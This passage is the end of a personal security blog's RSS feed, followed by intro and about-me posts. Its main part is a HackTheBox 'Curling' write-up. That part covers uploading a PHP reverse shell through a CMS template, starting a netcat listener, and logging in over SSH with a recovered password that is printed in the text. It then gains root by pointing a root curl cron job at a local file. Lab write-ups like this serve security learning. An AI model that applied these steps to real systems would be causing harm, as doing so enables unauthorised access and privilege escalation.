&lt;p&gt;Then select a template and add a new file. I created &lt;code&gt;about.php&lt;/code&gt; containing a &lt;a href=&#34;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&#34;&gt;php shell&lt;/a&gt;:
&lt;img src=&#34;/htb/1b8d711796ac40d9ad58425d129e1767.png&#34; alt=&#34;d800da04de39c2ca91fb3536f4f5c856.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Then open a listener (&lt;code&gt;nc -nvlp 4477&lt;/code&gt;) and visit the URL:
&lt;img src=&#34;/htb/afa0d4d413924c5388f9a6970378b832.png&#34; alt=&#34;d35792bdfeb25c2de532bd38e639694b.png&#34;&gt;
&lt;img src=&#34;/htb/684fcd5b4ce34c478bc8a256b36bc7a9.png&#34; alt=&#34;65dd02976c1d8307cfd9cc5f17a78228.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;uncompressing-password_backup&#34;&gt;Uncompressing password_backup&lt;/h1&gt;
&lt;p&gt;When we get in the user directory we see a &lt;code&gt;password_backup&lt;/code&gt; file. Lets download it in our computer.
&lt;img src=&#34;/htb/e4d7dc84c786483c9cf76e53c52023cd.png&#34; alt=&#34;f3f459d381516a0ccf7851d8cabd835b.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lets reverse the hexdump using &lt;code&gt;xxd -r password backup&lt;/code&gt;. So this file is compressed multiple times with different algorithms (gzip,tar,bzip2). Lets uncompress all of them. Using the command file &lt;em&gt;file&lt;/em&gt; we can see the type of archive and use the extract command needed for this type of file. The original file:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/htb/35aca7f47d5f4f6d9d34dfd6447de687.png&#34; alt=&#34;4685a47d7d9924eec2d16279efde6bc3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lets use this pass to login via ssh (&lt;code&gt;floris&lt;/code&gt;:&lt;code&gt;5d&amp;lt;wdCbdZu)|hChXll&lt;/code&gt;):
&lt;img src=&#34;/htb/bf23352bc8404a988394d869752ad4b3.png&#34; alt=&#34;6dd1741485652a5ff061e3b1bd99be1e.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Great, we now have access as &lt;code&gt;floris&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
&lt;p&gt;In our user directory we notice a weird folder named &lt;code&gt;admin-area&lt;/code&gt;:
&lt;img src=&#34;/htb/a1ebb755947f4ddbb73fa155e436a070.png&#34; alt=&#34;d264cefcb0b33d2bb4020efcb57a0ef9.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can write in input with our user and the contents will be read by root  🤔.&lt;/p&gt;
&lt;p&gt;To enumerate the system we can use linpeas.sh:
&lt;img src=&#34;/htb/bd186349a3034b048283353e33cedaef.png&#34; alt=&#34;0b1c2aff298ae0267ed335aaca6ea7fb.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Some interesting info showed up but lets go more in depth in the weird folder &lt;code&gt;admin-area&lt;/code&gt;. In the &lt;code&gt;input&lt;/code&gt; file a url is being defined:
&lt;img src=&#34;/htb/87b2035b348e4673b5d53d31a6b891c0.png&#34; alt=&#34;2a8e24400684cff0c462df0a055580e9.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;report&lt;/code&gt; is the result. If we open the file we notice that a web page is being download. Could the name of the machine (&amp;quot;&lt;em&gt;Curling&lt;/em&gt;&amp;quot;) be a reference to the curl command?&lt;/p&gt;
&lt;p&gt;Well the answer is yes.
We notice that this is probably a cronjob since the &lt;code&gt;input&lt;/code&gt; file gets refreshed&amp;hellip;&lt;/p&gt;
&lt;p&gt;What we see in the report is the result of a curl command with the &lt;code&gt;url&lt;/code&gt; in file &lt;code&gt;input&lt;/code&gt;. We can grab remote files, but can we grab a local one?&lt;/p&gt;
&lt;p&gt;It turns out that in linux you get a local file with the prefix:&lt;code&gt;file:///&lt;/code&gt;. So &lt;code&gt;url = &amp;quot;file:///root/root.txt&amp;quot;&lt;/code&gt; should work right?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/htb/22ee47757239454cb01efba4a6f8cb63.png&#34; alt=&#34;f2861164726786a63c5b812a08911410.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lets wait a bit&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/htb/2a236ba8498a40f09c9a1bf906d3f983.png&#34; alt=&#34;6a11a0a0467303b28204eb2185c40f18.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;And we get the root flag.
root.txt:&lt;code&gt;82c198ab6fc5365fdc6da2ee5c26064a&lt;/code&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>My First Post</title>
      <link>/posts/my-first-post/</link>
      <pubDate>Wed, 31 Mar 2021 01:10:51 +0300</pubDate>
      
      <guid>/posts/my-first-post/</guid>
      <description>Hello and welcome to my blog! Just testing the capabilities of Hugo. In the future I am planning to update the blog with HackTheBox machine and challenge writeups, CTF writeups and security related blog posts.</description>
      <content>&lt;p&gt;Hello and welcome to my blog! Just testing the capabilities of Hugo. In the future I am planning to update the blog with HackTheBox machine and challenge writeups, CTF writeups and security related blog posts.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>About Me</title>
      <link>/about/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/about/</guid>
      <description>Hi 👋,
my name is Dimitris Lazarakis aka dim1119. Avid infosec enthusiast and especially interested in topics such as penetration testing and system exploitation. I like understanding how things work in low level.
In addition to infosec my interests include everything car related, electrical/hardware designing, music production and long walks!</description>
      <content>&lt;p&gt;Hi 👋,&lt;/p&gt;
&lt;p&gt;my name is Dimitris Lazarakis aka &lt;em&gt;dim1119&lt;/em&gt;. Avid infosec enthusiast and especially interested in topics such as penetration testing and system exploitation. I like understanding how things work in low level.&lt;/p&gt;
&lt;p&gt;In addition to infosec my interests include everything car related, electrical/hardware designing, music production and long walks!&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
